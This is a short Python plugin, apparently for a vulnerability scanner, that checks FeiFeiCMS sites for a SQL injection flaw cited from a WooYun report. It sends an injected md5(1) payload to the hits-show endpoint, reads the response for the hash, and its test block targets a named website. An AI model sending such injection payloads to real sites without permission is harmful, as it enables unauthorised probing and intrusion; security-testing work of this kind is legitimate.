#!/usr/bin/env python
#-*- coding:utf-8 –*-
#refer http://www.wooyun.org/bugs/wooyun-2010-060233
from re import *
def assign(service,arg):
    if service == "feifeicms":
        return True,arg
def audit(arg):
    url = arg + 'index.php?s=hits-show&sid=md5(1)%23&type=md5(1)'
    
    code, head, res, errcode, _ = curl.curl(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('feifeicms','http://www.mnz123.com/')[1])